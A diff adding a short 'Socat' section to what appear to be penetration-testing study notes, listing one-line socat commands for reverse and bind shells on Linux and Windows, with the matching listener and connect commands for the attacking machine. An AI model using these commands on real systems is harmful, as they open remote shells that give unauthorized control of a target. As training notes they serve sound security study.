@@ -47,6 +47,16 @@ Note that if the shell dies, any input in your own terminal will not be visible 
 `stty rows <number>`  
 `stty cols <number>`
 
+### Socat
+*Reverse Shells*  
+`socat TCP-L:<port> -`:  this is taking two points (a listening port, and standard input) and connecting them together.  
+`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`: On Windows command to connect back  
+`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`: On Linux  
+
+*Bind Shells*  
+`socat TCP-L:<PORT> EXEC:"bash -li"`: On a Linux target  
+`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`: On a Windows target  
+`socat TCP:<TARGET-IP>:<TARGET-PORT> -`:  On an attacking machine  
 
 
 
